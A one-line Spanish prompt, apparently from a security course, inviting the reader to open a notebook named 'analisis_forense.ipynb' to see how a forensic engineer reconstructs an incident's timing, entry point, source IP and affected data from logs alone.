👉 Abra ahora **`analisis_forense.ipynb`** y vea cómo el ingeniero forense reconstruye todo esto —cuándo, por dónde, cómo, desde qué IP y qué datos— **solo con esos registros**.